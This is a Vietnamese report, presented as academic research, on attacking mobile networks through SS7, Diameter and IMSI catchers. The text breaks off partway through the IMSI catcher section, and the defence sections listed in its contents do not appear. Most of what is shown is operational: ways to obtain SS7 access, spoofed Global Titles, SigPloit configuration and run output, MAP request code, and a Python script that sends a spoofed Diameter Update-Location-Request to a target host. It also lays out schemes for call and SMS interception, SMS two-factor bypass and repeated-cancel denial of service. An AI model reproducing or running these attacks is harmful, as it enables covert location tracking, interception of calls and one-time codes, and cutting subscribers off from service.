# Báo Cáo Khoa Học: Kỹ Thuật Xâm Nhập và Vô Hiệu Hóa Mạng Di Động

**Lĩnh vực:** An toàn thông tin – Bảo mật mạng viễn thông  
**Phân loại:** Nghiên cứu học thuật – Phân tích lỗ hổng kỹ thuật  
**Ngày:** 2026-06-08  

---

## Mục Lục

1. [Tổng Quan Kiến Trúc Mạng Di Động](#1-tổng-quan-kiến-trúc-mạng-di-động)
2. [SS7 Exploitation](#2-ss7-exploitation)
3. [Diameter Protocol Attack](#3-diameter-protocol-attack)
4. [IMSI Catcher](#4-imsi-catcher)
5. [SIM Cloning / Intercept](#5-sim-cloning--intercept)
6. [Fake eNodeB (SDR-based)](#6-fake-enodeb-sdr-based)
7. [SS7 Call Redirection](#7-ss7-call-redirection)
8. [Selective Jamming](#8-selective-jamming)
9. [TV / DVB Signal Hijacking](#9-tv--dvb-signal-hijacking)
10. [Kết Hợp Tấn Công Đa Vector](#10-kết-hợp-tấn-công-đa-vector)
11. [So Sánh Và Phân Loại](#11-so-sánh-và-phân-loại)
12. [Cơ Chế Phòng Thủ](#12-cơ-chế-phòng-thủ)
13. [Kết Luận](#13-kết-luận)
14. [Tài Liệu Tham Khảo](#14-tài-liệu-tham-khảo)

---

## 1. Tổng Quan Kiến Trúc Mạng Di Động

Để hiểu đầy đủ bề mặt tấn công, cần nắm kiến trúc phân lớp của mạng di động qua các thế hệ:

### 1.1 Kiến Trúc Mạng 2G/GSM

```
┌──────────────────────────────────────────────────────────────────┐
│                         CORE NETWORK (CN)                        │
│                                                                  │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────────┐   │
│  │   HLR   │    │   VLR   │    │   MSC   │    │   SMSC/GMSC │   │
│  │(Home    │◄──►│(Visitor │◄──►│(Mobile  │◄──►│(SMS/Gateway │   │
│  │ Location│    │ Location│    │ Switch  │    │  MSC)       │   │
│  │ Register│    │ Register│    │ Center) │    └─────────────┘   │
│  └────┬────┘    └─────────┘    └────┬────┘                      │
│       │                             │                            │
│  ┌────▼──────────────────────────────▼────────────────────────┐  │
│  │              SS7 Signalling Network (MTP + MAP)            │  │
│  └────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │   BSS (Base Station  │
                    │   Subsystem)         │
                    │  BSC ──────── BTS    │
                    └──────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Mobile Station    │
                    │   (MS / Điện thoại) │
                    └─────────────────────┘
```

**Giao diện chính bị khai thác:**
- **A-interface**: MSC ↔ BSC (kết nối lõi và vô tuyến)
- **MAP (Mobile Application Part)**: Giao thức L7 trên SS7, dùng giữa HLR/MSC/VLR/SMSC

### 1.2 Kiến Trúc Mạng 4G/LTE (EPC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                    EVOLVED PACKET CORE (EPC)                           │
│                                                                        │
│  ┌───────┐  S6a  ┌───────┐  S11  ┌───────┐  S5/S8  ┌──────────────┐  │
│  │  HSS  │◄─────►│  MME  │◄─────►│ S-GW  │◄───────►│    P-GW      │  │
│  │(Home  │       │(Mobil.│       │(Serv. │         │(PDN Gateway) │  │
│  │Subscr.│       │ Mgmt. │       │ GW)   │         └──────────────┘  │
│  │Server)│       │Entity)│       └───────┘                           │
│  └───────┘       └───┬───┘                                            │
│                      │ S1-MME                                         │
│  ┌───────────────────────────────────────────────┐                    │
│  │            Diameter Protocol (S6a, Gx, Gy...) │                    │
│  └───────────────────────────────────────────────┘                    │
└────────────────────────────────────────────────────────────────────────┘
                          │ S1-U / S1-MME
               ┌──────────▼──────────┐
               │  E-UTRAN            │
               │  eNodeB (trạm LTE)  │
               └──────────┬──────────┘
                          │ LTE-Uu (air interface)
               ┌──────────▼──────────┐
               │  UE (User Equipment)│
               └─────────────────────┘
```

**Giao diện chính bị khai thác:**
- **S6a**: MME ↔ HSS qua Diameter (nhận dạng, xác thực, hồ sơ thuê bao)
- **LTE-Uu**: Giao diện không dây giữa UE và eNodeB (IMSI catcher, fake eNodeB)

### 1.3 Bề Mặt Tấn Công Tổng Hợp

```
Lớp vật lý / vô tuyến (L1–L2):
  ├── IMSI Catcher (GSM/3G/4G)
  ├── Fake eNodeB
  └── Selective Jamming

Lớp giao thức báo hiệu (L7 – Signalling Plane):
  ├── SS7 MAP exploitation
  ├── Diameter EPC attacks
  └── SS7 Call Redirection

Lớp vật lý SIM (Physical):
  └── SIM Cloning / Intercept

Lớp phát sóng (Broadcast RF):
  └── DVB / TV Signal Hijacking
```

---

## 2. SS7 Exploitation

### 2.1 Lịch Sử và Bối Cảnh

SS7 được thiết kế từ năm 1975 bởi CCITT (nay là ITU-T), hoàn thiện vào 1980 và triển khai đại trà vào thập niên 1990. Toàn bộ hệ thống viễn thông toàn cầu – định tuyến cuộc gọi quốc tế, roaming, SMS liên mạng – phụ thuộc vào SS7.

Năm 2008, Tobias Engel lần đầu trình bày tại 25C3 về khả năng theo dõi vị trí qua SS7. Năm 2014, cùng với Karsten Nohl, nhóm Security Research Labs trình diễn live tracking tại Quốc hội Mỹ, chứng minh khả năng theo dõi điện thoại của nghị sĩ Mỹ từ Berlin. Kể từ đó, SS7 exploitation trở thành chủ đề được nghiên cứu rộng rãi.

### 2.2 Ngăn Xếp Giao Thức SS7 Chi Tiết

```
┌────────────────────────────────────────────────────────┐
│  MAP (Mobile Application Part) – 3GPP TS 29.002        │
│  Các operation: SRI, PSI, ISD, RegisterSS, ForwardSM...│
├────────────────────────────────────────────────────────┤
│  TCAP (Transaction Capabilities Application Part)       │
│  ITU-T Q.771–Q.775: Quản lý giao dịch, dialogue        │
├────────────────────────────────────────────────────────┤
│  SCCP (Signalling Connection Control Part)              │
│  ITU-T Q.711–Q.716: Định tuyến theo Global Title (GT)  │
├────────────────────────────────────────────────────────┤
│  MTP3 (Message Transfer Part Level 3)                   │
│  ITU-T Q.704: Định tuyến theo Point Code (PC)          │
├────────────────────────────────────────────────────────┤
│  MTP2 (Message Transfer Part Level 2)                   │
│  ITU-T Q.703: Kiểm soát liên kết tín hiệu              │
├────────────────────────────────────────────────────────┤
│  MTP1 (Physical Layer)                                  │
│  64 kbps E1 links hoặc SIGTRAN (SS7 over IP/SCTP)      │
└────────────────────────────────────────────────────────┘

Triển khai hiện đại qua IP:
┌────────────────────┐    ┌────────────────────────────┐
│      MAP / TCAP    │    │     MAP / TCAP              │
├────────────────────┤    ├────────────────────────────┤
│    SCCP / M3UA     │    │    SCCP / M3UA              │
├────────────────────┤    ├────────────────────────────┤
│    SCTP            │◄──►│    SCTP                     │
├────────────────────┤    ├────────────────────────────┤
│    IP              │    │    IP                       │
└────────────────────┘    └────────────────────────────┘
   Attacker SGW                 Mạng SS7 global
```

**SIGTRAN** (SS7 over IP) là cầu nối quan trọng: kể từ khi các nhà mạng chuyển core network sang IP, SS7 được đóng gói trong M3UA/SCTP/IP, cho phép kết nối SS7 qua Internet nếu có tài khoản STP (Signal Transfer Point).

### 2.3 Cơ Chế Tin Tưởng Tuyệt Đối (Implicit Trust)

Bất kỳ thực thể nào trong mạng SS7 global đều có thể:
- Gửi lệnh MAP đến bất kỳ HLR/MSC/SMSC nào trên thế giới
- Giả mạo GT (Global Title – địa chỉ SS7) của bất kỳ mạng nào
- Không có cơ chế xác thực chữ ký hoặc certificate ở cấp giao thức

**Điểm truy cập vào SS7 (Attack Entry Points):**
1. Mua dịch vụ từ MVNO (Mobile Virtual Network Operator) có cấp quyền SS7
2. Tấn công/xâm nhập vào hệ thống của một nhà mạng nhỏ
3. Mua quyền truy cập STP từ nhà cung cấp dịch vụ signalling (đã ghi nhận tại một số quốc gia)
4. Khai thác điểm kết nối IPX (IP eXchange) liên mạng

### 2.4 Phân Loại Chi Tiết Các Tấn Công MAP

#### 2.4.1 Location Tracking

**Phương thức 1: SRI + PSI (chính xác nhất)**

```
Attacker                HLR mục tiêu              MSC/VLR hiện tại
    │                        │                           │
    │── SRI (MSISDN) ────────►│                           │
    │◄── SRI Response ────────│                           │
    │    (IMSI + MSC address) │                           │
    │                        │                           │
    │── PSI (IMSI) ──────────────────────────────────────►│
    │◄── PSI Response ────────────────────────────────────│
    │    (Cell-ID + LAC + IMEI + subscriber state)        │
```

Kết quả: Cell-ID + LAC → tra cứu cơ sở dữ liệu OpenCelliD/Google Maps API → tọa độ địa lý

**Phương thức 2: ATI (Any Time Interrogation)**

Lệnh `AnyTimeInterrogation` (ATI) trong MAP được thiết kế cho network management, nhưng cung cấp thông tin vị trí trực tiếp:

```
Attacker → ATI(MSISDN, "location info requested") → HLR
HLR → ATI Response:
  - IMSI
  - Current VLR address  
  - Cell Global Identity (MCC+MNC+LAC+CellID)
  - Age of Location Information (giây từ lần cập nhật cuối)
  - IMEI (nếu mạng lưu)
  - Subscriber State: assumedIdle / camelBusy / notProvidableFromVLR
```

**Phương thức 3: SRI-SM (theo dõi qua SMS)**

```
Attacker → SRI-SM(MSISDN) → HLR
HLR → SRI-SM Response:
  - IMSI
  - MSC/SGSN address (đang phục vụ thuê bao)
→ Xác nhận thuê bao đang active, suy ra vùng phủ sóng hiện tại
```

**Độ chính xác theo môi trường:**

| Môi trường | Cell radius | Độ chính xác vị trí |
|---|---|---|
| Nội thành dày đặc | 50–200m | ±100m |
| Ngoại ô | 500m–2km | ±1km |
| Nông thôn | 5–30km | ±15km |
| Vùng sâu | >30km | ±30km |

#### 2.4.2 Call Interception Setup

Để chặn cuộc gọi, attacker cần:

**Bước 1**: Dùng SRI lấy IMSI + địa chỉ MSC hiện tại

**Bước 2**: Gửi `InsertSubscriberData` (ISD) đến VLR, ghi đè hồ sơ dịch vụ:
```
ISD payload:
  - IMSI: [target]
  - Basic service: teleservice 11 (telephony)
  - Call forwarding data:
      - CFU active: TRUE
      - Forwarded-to-number: [attacker MSRN hoặc gateway]
  - CAMEL subscription info (nếu mạng hỗ trợ O-CSI):
      - Service key
      - gsmSCF address: [attacker SCP]
```

**Bước 3**: Khi cuộc gọi đến, MSC đọc hồ sơ ISD → chuyển hướng đến gateway attacker

**Bước 4**: Gateway attacker relay cuộc gọi sang điện thoại thật, đồng thời fork audio stream để ghi âm:

```
Caller ──────► MSC ──ISD CFU──► Attacker Gateway ──relay──► Target Phone
                                        │
                                   [Audio Fork]
                                        │
                                   [Recording]
```

#### 2.4.3 SMS Interception

```
Bước 1: SRI-SM → lấy SMSC address + IMSI của mục tiêu
Bước 2: Đăng ký SMSC giả (hoặc forward SMSC address)
Bước 3: ISD → ghi đè MO/MT SMS routing trong VLR
Bước 4: SMS đến/đi đi qua attacker trước khi đến đích
```

**Ứng dụng thực tế nghiên cứu**: Vượt qua 2FA dựa trên SMS — attacker nhận OTP trước nạn nhân, sau đó relay SMS đến nạn nhân để tránh bị phát hiện.

#### 2.4.4 IMSI Enumeration

Mạng SS7 cho phép brute-force IMSI từ MSISDN:
```
SRI(MSISDN="+84901234567") → IMSI response
→ Lặp qua danh sách MSISDN, thu thập IMSI database
```
IMSI sau đó được dùng trong các tấn công nâng cao (PSI, ATI trực tiếp qua IMSI).

### 2.5 Đầu Vào (Input) Chi Tiết

| Thành phần | Mô tả | Cách thu thập |
|---|---|---|
| **SS7 access point** | Kết nối STP/SGW hợp lệ | Mua từ MVNO hoặc SS7 hub |
| **GT của attacker** | Địa chỉ SS7 giả mạo là HLR/MSC | Lấy từ nhà mạng cung cấp access |
| **MSISDN mục tiêu** | Số điện thoại | Thông tin công khai hoặc thu thập trước |
| **IMSI mục tiêu** | 15 chữ số duy nhất định danh SIM | Từ SRI response hoặc IMSI catcher |
| **Phần mềm MAP** | Tool tạo và gửi MAP PDU | SigPloit, SS7MAPer, tự viết |
| **SCTP/M3UA stack** | Lớp vận chuyển SS7 over IP | Linux kernel SCTP module |

### 2.6 Đầu Ra (Output) Chi Tiết

```
Location tracking output:
  ├── Cell-ID (28-bit: MCC+MNC+LAC+CellID)
  ├── Toạ độ GPS (sau khi tra OpenCelliD)
  ├── Tên tòa nhà / khu vực (reverse geocoding)
  └── Lịch sử di chuyển (nếu polling liên tục)

Call interception output:
  ├── PCM audio stream (G.711 μ-law, 64 kbps)
  ├── Timestamp cuộc gọi (start/end)
  └── CLI/CLIR (số gọi đến/từ)

SMS interception output:
  ├── Nội dung SMS (UTF-8 / GSM 7-bit)
  ├── Sender/Receiver MSISDN
  └── Timestamp
```

### 2.7 Công Cụ Chi Tiết

#### 2.7.1 SigPloit

```
Repository: github.com/SigPloiter/SigPloit
Ngôn ngữ: Python 3
Phụ thuộc: pycrate, pyshark, scapy

Cấu trúc dự án:
SigPloit/
├── sigploit.py              # Entry point, menu tương tác
├── configs/
│   └── ss7.cfg              # Cấu hình kết nối STP
├── telecom/
│   ├── ss7/
│   │   ├── map_attacks.py   # 15+ MAP attack implementations
│   │   ├── SRI.py           # Send Routing Information
│   │   ├── PSI.py           # Provide Subscriber Information
│   │   ├── ATI.py           # Any Time Interrogation
│   │   ├── ISD.py           # Insert Subscriber Data
│   │   ├── RegisterSS.py    # Register Supplementary Service
│   │   └── ForwardSM.py     # Forward Short Message
│   ├── diameter/
│   │   └── diameter_attacks.py
│   └── gsm/
│       └── gsm_attacks.py
└── libs/
    └── pycrate/             # ASN.1 encode/decode library
```

**Cấu hình kết nối SS7 (ss7.cfg):**
```ini
[SS7]
# Địa chỉ STP kết nối
STP_IP = 10.0.0.1
STP_PORT = 2905

# Global Title của attacker (giả mạo là HLR)
OPC = 1-1-1          # Originating Point Code
DPC = 2-2-2          # Destination Point Code
GT_attacker = +49XXXXXXXXXX   # GT giả mạo HLR Đức

# SCTP parameters
SCTP_PPID = 3        # M3UA PPID
```

**Chạy tấn công location tracking:**
```bash
python3 sigploit.py
# Menu:
# [1] SS7 Attacks
#   [1] Location Tracking
#     [1] SRI Attack
#       Enter MSISDN: +84901234567
#       [*] Sending SRI...
#       [+] IMSI: 452040123456789
#       [+] MSC Address: +84282000001
#     [2] PSI Attack
#       Enter IMSI: 452040123456789
#       [+] Cell-ID: 452-04-3421-12345
#       [+] Location: 10.7756°N, 106.6979°E (Quận 1, TP.HCM)
```

**Ví dụ code tạo MAP PSI request thủ công (pycrate):**
```python
from pycrate_mobile.TS29002_MAP import *
from pycrate_asn1rt.utils import *

# Tạo MAP ProvideSubscriberInfo argument
psi_arg = MAP_MS_DataTypes.ProvideSubscriberInfo_Arg()
psi_arg['imsi']['value'].set_val(bytes.fromhex('24040112345678F9'))  # IMSI BCD
psi_arg['requestedInfo']['locationInformation'].set_val(None)
psi_arg['requestedInfo']['subscriberState'].set_val(None)

# Encode thành BER
psi_bytes = psi_arg.to_ber()

# Bọc trong TCAP BEGIN + SCCP/MTP3/SCTP và gửi
# (phần transport tùy thuộc vào stack SS7 sử dụng)
```

#### 2.7.2 SS7MAPer

```
Nguồn: Tobias Engel, CCC 2014
Ngôn ngữ: Python
Chức năng nổi bật:
  - Bulk location tracking từ file CSV chứa danh sách MSISDN
  - Export kết quả sang KML (Google Earth) để visualize di chuyển
  - Rate limiting để tránh trigger IDS của mạng đích
  
Cấu trúc output (CSV):
MSISDN,IMSI,MCC,MNC,LAC,CellID,Lat,Long,Country,Network,Timestamp
+84901234567,452040xxx,452,04,3421,12345,10.775,106.697,VN,Viettel,2026-06-08T10:30:00
```

#### 2.7.3 SCTP/M3UA Stack (Linux)

```bash
# Cài đặt SCTP kernel module
sudo modprobe sctp
sudo apt install lksctp-tools

# Kiểm tra kết nối SCTP đến STP
sctp_test -H 0.0.0.0 -h 10.0.0.1 -p 2905 -s

# Wireshark filter cho SS7 traffic
# m3ua || sccp || tcap || gsm_map
```

#### 2.7.4 OpenGTS / CelliD Lookup

Sau khi thu thập Cell-ID từ PSI response, ánh xạ sang tọa độ:

```python
import requests

def cell_to_coords(mcc, mnc, lac, cell_id):
    """Tra cứu tọa độ từ Cell-ID qua OpenCelliD API"""
    url = "https://opencellid.org/cell/get"
    params = {
        "key": "API_KEY",
        "mcc": mcc, "mnc": mnc,
        "lac": lac, "cellid": cell_id,
        "format": "json"
    }
    r = requests.get(url, params=params)
    data = r.json()
    return data.get("lat"), data.get("lon"), data.get("range")

# Ví dụ
lat, lon, acc = cell_to_coords(452, 4, 3421, 12345)
print(f"Vị trí: {lat}°N, {lon}°E (±{acc}m)")
```

### 2.8 Triển Khai Hệ Thống Đầy Đủ

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker Infrastructure                       │
│                                                                 │
│  ┌─────────────────┐      ┌─────────────────────────────────┐   │
│  │   Attack Server  │      │     SS7 Signalling Gateway      │   │
│  │  (Linux/Python)  │      │  (Kamailio + SIGTRAN + pycrate) │   │
│  │                  │      │                                 │   │
│  │  SigPloit        │◄────►│  M3UA ↔ SCTP ↔ IP              │   │
│  │  SS7MAPer        │      │  GT: +49xxxxxxxxxx (spoof)      │   │
│  │  CelliD Lookup   │      └────────────┬────────────────────┘   │
│  │  Audio Recorder  │                   │                        │
│  │  SMS Logger      │                   │ SCTP (port 2905)       │
│  └─────────────────┘                   │                        │
└─────────────────────────────────────────│────────────────────────┘
                                          │
                               ┌──────────▼──────────┐
                               │   SS7 Global Network │
                               │   (STP / IPX Hub)    │
                               └──────────┬───────────┘
                                          │
                    ┌─────────────────────┼─────────────────────┐
                    │                     │                      │
          ┌─────────▼───────┐   ┌─────────▼───────┐   ┌────────▼────────┐
          │  HLR/MSC mạng A │   │  HLR/MSC mạng B │   │  SMSC mạng C   │
          │  (Viettel, VN)  │   │  (T-Mobile, US)  │   │  (Any carrier)  │
          └─────────────────┘   └─────────────────┘   └─────────────────┘
```

---

## 3. Diameter Protocol Attack

### 3.1 Kiến Trúc Diameter trong 4G/LTE

Diameter (RFC 6733) thay thế SS7 MAP trong mạng 4G nhưng giữ nguyên nhiều đặc điểm kiến trúc của SS7, đặc biệt là mô hình tin cậy liên nhà mạng.

**Các giao diện Diameter trong EPC:**

```
┌──────────────────────────────────────────────────────────────────┐
│                      EPC Diameter Interfaces                     │
│                                                                  │
│  MME ──S6a──► HSS        (Authentication, Location Update)       │
│  MME ──S13──► EIR        (IMEI check)                            │
│  PCRF ──Gx──► P-GW       (Policy, QoS)                          │
│  PCRF ──Rx──► P-CSCF     (IMS policy)                           │
│  OCS ──Gy──► P-GW        (Online Charging)                      │
│  PCRF ──S9──► vPCRF      (Roaming policy)                       │
│                                                                  │
│  Kết nối liên nhà mạng:                                         │
│  MME ──S6a──► [DEA] ──[IPX/DRA]──► [DEA] ──S6a──► HSS(roaming) │
└──────────────────────────────────────────────────────────────────┘
```

### 3.2 Cấu Trúc Message Diameter

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Version    |                 Message Length                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| R P E T r r r |              Command Code                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Application-ID                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      Hop-by-Hop Identifier                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      End-to-End Identifier                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  AVPs (Attribute-Value Pairs) ...                             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Flags: R=Request, P=Proxiable, E=Error, T=Potentially re-transmitted
```

### 3.3 Phân Tích Chi Tiết Từng Loại Tấn Công

#### 3.3.1 Location Disclosure (ULR Spoofing)

**Update-Location-Request (ULR)** là lệnh MME gửi đến HSS khi UE attach vào mạng, để thông báo MME đang phục vụ UE và yêu cầu hồ sơ dịch vụ.

**Tấn công:** Attacker giả mạo là MME, gửi ULR đến HSS mục tiêu:

```
Attacker (giả MME) ──ULR──► HSS mục tiêu
  AVPs trong ULR:
    User-Name (IMSI): 452040123456789
    RAT-Type: EUTRAN (1004)
    ULR-Flags: Register-MME + Skip-Subscriber-Data
    Origin-Host: fake-mme.epc.mnc004.mcc452.3gppnetwork.org
    Origin-Realm: epc.mnc004.mcc452.3gppnetwork.org

HSS phản hồi ULA (Update-Location-Answer):
    Result-Code: DIAMETER_SUCCESS (2001)
    Subscription-Data:
      → MSISDN
      → Network-Access-Mode
      → Context-Identifier
      → PDN connectivity settings
      → Roaming restrictions
      → Operator-Determined-Barring
```

HSS không xác minh Origin-Host có thực sự là MME hợp lệ hay không → attacker nhận được toàn bộ hồ sơ dịch vụ.

#### 3.3.2 Cancel Location (CLR) – DoS cho Thuê Bao

```
Attacker ──CLR──► HSS
  CLR gửi đến HSS với IMSI mục tiêu
  HSS gửi CLR đến MME hiện tại của UE
  MME xóa ngữ cảnh UE, gửi Detach Request xuống UE
  UE bị buộc detach khỏi mạng → mất dịch vụ
  UE phải re-attach → trong thời gian re-attach: no service
```

Nếu attacker gửi CLR liên tục với tần suất cao hơn re-attach time → **permanent DoS** cho thuê bao mục tiêu.

#### 3.3.3 Insert Subscriber Data (IDR)

Tương tự ISD trong SS7 MAP, IDR cho phép ghi đè hồ sơ dịch vụ trong HSS:

```
Attacker ──IDR──► MME (giả HSS)
  IDR payload:
    Subscription-Data:
      → AMBR: 0/0 (giới hạn băng thông về 0 → DoS dữ liệu)
      → PDN-GW-Allocation-Type: DYNAMIC → chuyển hướng dữ liệu
      → APN-Configuration: attacker APN
```

#### 3.3.4 Re-Auth-Request (RAR) – Ép Xác Thực Lại

```
Attacker ──RAR──► MME (giả PCRF/HSS)
  MME buộc UE thực hiện EPS-AKA lại
  Trong quá trình xác thực lại: window để MITM KASME derivation
  (Lý thuyết; thực tế cần thêm điều kiện)
```

### 3.4 Đầu Vào

| Thành phần | Mô tả |
|---|---|
| **Diameter peer connection** | Kết nối TCP/SCTP đến DEA/DRA liên mạng (port 3868) |
| **Origin-Realm hợp lệ** | Domain 3GPP của mạng giả mạo (vd: `epc.mnc004.mcc452.3gppnetwork.org`) |
| **IMSI mục tiêu** | Từ SS7 SRI hoặc IMSI catcher |
| **Application-ID** | S6a = 16777251 (3GPP TS 29.272) |
| **Phần mềm** | freeDiameter, SigPloit Diameter module, jDiameter |

### 3.5 Đầu Ra

- Hồ sơ dịch vụ đầy đủ của thuê bao (MSISDN, APN, QoS profile, roaming config)
- Gián đoạn dịch vụ (CLR attack) – UE mất 10–60 giây dịch vụ mỗi lần bị cancel
- Chặn/chuyển hướng lưu lượng dữ liệu (IDR với APN giả)
- Vị trí (E-UTRAN Cell Global Identifier – ECGI, chính xác hơn SS7)

### 3.6 Công Cụ Chi Tiết

#### 3.6.1 freeDiameter

```
Nguồn: freediameter.net (C, mã nguồn mở)
Cấu trúc:
  freeDiameter/
  ├── freeDiameterd          # Daemon chính
  ├── extensions/
  │   ├── dict_3gpp2_*       # Dictionary các AVP 3GPP
  │   ├── app_diameap        # EAP application
  │   └── dbg_msg_dumps      # PCAP export
  └── include/freeDiameter/

Cấu hình (freeDiameter.conf):
Identity = "fake-mme.epc.mnc004.mcc452.3gppnetwork.org";
Realm = "epc.mnc004.mcc452.3gppnetwork.org";

ConnectPeer = "dra.ims.mnc004.mcc452.3gppnetwork.org" {
    ConnectTo = "10.0.0.2";
    Port = 3868;
    TLS_Disabled;   # Nhiều triển khai thực tế tắt TLS
    Tc = 30;
};

LoadExtension = "dbg_msg_dumps.fdx" : "0x8888";
LoadExtension = "app_s6a.fdx";  # Custom extension tấn công S6a
```

#### 3.6.2 Script Tấn Công ULR (Python + diameter library)

```python
"""
Diameter ULR Attack - Location Disclosure via S6a interface
Minh họa học thuật, dựa trên RFC 6733 và 3GPP TS 29.272
"""
import socket
import struct

# Diameter AVP codes (3GPP TS 29.272)
AVP_USER_NAME       = 1       # IMSI
AVP_SESSION_ID      = 263
AVP_ORIGIN_HOST     = 264
AVP_ORIGIN_REALM    = 296
AVP_DEST_REALM      = 283
AVP_DEST_HOST       = 293
AVP_AUTH_APP_ID     = 258
AVP_RESULT_CODE     = 268
AVP_RAT_TYPE        = 1032    # Vendor 3GPP
AVP_ULR_FLAGS       = 1405    # Vendor 3GPP

APP_ID_S6a          = 16777251  # 3GPP S6a Application

CMD_ULR             = 316     # Update-Location-Request

def build_avp(code, value, vendor_id=None, flags=0x40):
    """Xây dựng Diameter AVP theo RFC 6733"""
    if vendor_id:
        flags |= 0x80   # Vendor-Specific flag
        header = struct.pack("!IBI", code, flags, len(value) + 12)
        header += struct.pack("!I", vendor_id)
    else:
        header = struct.pack("!IBI", code, flags, len(value) + 8)
    
    avp = header + value
    # Padding to 4-byte boundary
    pad = (4 - len(avp) % 4) % 4
    return avp + b'\x00' * pad

def build_ulr(imsi_str, origin_host, origin_realm, dest_realm, dest_host):
    """Xây dựng Update-Location-Request message"""
    imsi_bytes = imsi_str.encode('utf-8')
    
    avps = b""
    avps += build_avp(AVP_SESSION_ID, b"fake-mme;1;1")
    avps += build_avp(AVP_USER_NAME, imsi_bytes)
    avps += build_avp(AVP_ORIGIN_HOST, origin_host.encode())
    avps += build_avp(AVP_ORIGIN_REALM, origin_realm.encode())
    avps += build_avp(AVP_DEST_REALM, dest_realm.encode())
    avps += build_avp(AVP_DEST_HOST, dest_host.encode())
    avps += build_avp(AVP_AUTH_APP_ID, struct.pack("!I", APP_ID_S6a))
    avps += build_avp(AVP_RAT_TYPE, struct.pack("!I", 1004),
                      vendor_id=10415)  # 3GPP vendor, EUTRAN=1004
    avps += build_avp(AVP_ULR_FLAGS, struct.pack("!I", 0x3),
                      vendor_id=10415)  # Register-MME + Skip-Subscriber-Data
    
    # Diameter Header: Version(1) + Length(3) + Flags(1) + CmdCode(3) + AppID(4) + HopID(4) + E2EID(4)
    total_len = 20 + len(avps)
    flags = 0x80  # Request flag
    header = struct.pack("!BBHBBBIII",
        1, (total_len >> 16) & 0xFF, total_len & 0xFFFF,
        flags, (CMD_ULR >> 16) & 0xFF, (CMD_ULR >> 8) & 0xFF, CMD_ULR & 0xFF,
        APP_ID_S6a, 0x00000001, 0x00000001)
    
    return header + avps

# Gửi đến DEA
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("dea.target-network.com", 3868))
msg = build_ulr(
    imsi_str="452040123456789",
    origin_host="fake-mme.epc.mnc004.mcc452.3gppnetwork.org",
    origin_realm="epc.mnc004.mcc452.3gppnetwork.org",
    dest_realm="epc.mnc001.mcc234.3gppnetwork.org",
    dest_host="hss.epc.mnc001.mcc234.3gppnetwork.org"
)
sock.send(msg)
response = sock.recv(4096)
# Parse ULA response để lấy Subscription-Data
```

---

## 4. IMSI Catcher

### 4.1 Nguyên Lý Cell Selection / Reselection

Điện thoại di động liên tục quét tất cả các cell khả dụng và chọn cell "tốt nhất" theo thuật toán chuẩn hóa:

**GSM (2G) – C1/C2 criterion:**
```
C1 = RxLev(cell) - RXLEV_ACCESS_MIN - max(0, MS_TXPWR_MAX - P)
C2 = C1 + CELL_RESELECT_OFFSET - TEMPORARY_OFFSET × H(PENALTY_TIME - T)

Điện thoại chọn cell có C2 cao nhất
→ Fake BTS chỉ cần phát với C2 > tất cả BTS thật trong vùng
```

**LTE (4G) – RSRP/RSRQ criterion:**
```
Sreselection = Qrxlevmeas - Qrxlevmin
Điện thoại kết nối cell có RSRP cao nhất thỏa mãn cell selection criteria
→ Fake eNodeB phát RSRP mạnh hơn → UE tự kết nối
```

**Khai thác**: IMSI Catcher phát tín hiệu mạnh hơn → điện thoại tự "chọn" kết nối vào trạm giả mà không có cảnh báo rõ ràng cho người dùng.

### 4.2 Giao Thức Nhận Dạng Thuê Bao

**GSM – Identity Procedure:**
```
IMSI Catcher                              Mobile Station (MS)
    │                                           │
    │── RR Channel Activation ─────────────────►│
    │◄─ Channel Request ────────────────────────│
    │── Immediate Assignment ──────────────────►│
    │◄─ CM Service Request (TMSI=xxx) ──────────│
    │── Identity Request (type=IMSI) ──────────►│
    │◄─ Identity Response (IMSI=452040xxx) ─────│
    │── Authentication Request (RAND) ─────────►│
    │   (có thể bỏ qua bước này nếu chỉ lấy IMSI)
    │── [Reject / Detach] ────────────────────►│
    │   (điện thoại tự kết nối lại vào BTS thật)
```

**LTE – NAS Identity Procedure:**
```
Fake eNodeB                               UE
    │                                      │
    │── SIB1/SIB2 (beacon, MCC/MNC) ──────►│  ← UE nghe, chọn cell
    │◄─ RRC Connection Request ────────────│
    │── RRC Connection Setup ─────────────►│
    │◄─ RRC Connection Setup Complete ─────│
    │   + NAS: Attach Request (GUTI/TMSI)  │
    │── Identity Request (IMSI) ───────────►│
    │◄─ Identity Response (IMSI) ───────────│
    │── [Attach Reject + cause] ───────────►│
    │   UE re-tries with real network       │
```

**4G Mitigation + Bypass:**
- 4G yêu cầu **mutual authentication** (mạng cũng phải xác thực với UE qua AUTN)
- Tuy nhiên: UE tiết lộ IMSI **trước** khi mutual auth nếu không có valid GUTI
- **Downgrade attack**: Fake eNodeB gửi `RRC Connection Release` với redirect đến GSM/3G → UE về GSM → IMSI Catcher hoạt động như trên GSM

### 4.3 Chế Độ Hoạt Động

| Chế độ | Mô tả | Phát hiện |
|---|---|---|
| **Passive enumeration** | Chỉ ghi IMSI, không relay → UE mất dịch vụ tạm thời | Khó |
| **Active MITM** | Relay qua mạng thật → UE có dịch vụ bình thường | Khó hơn |
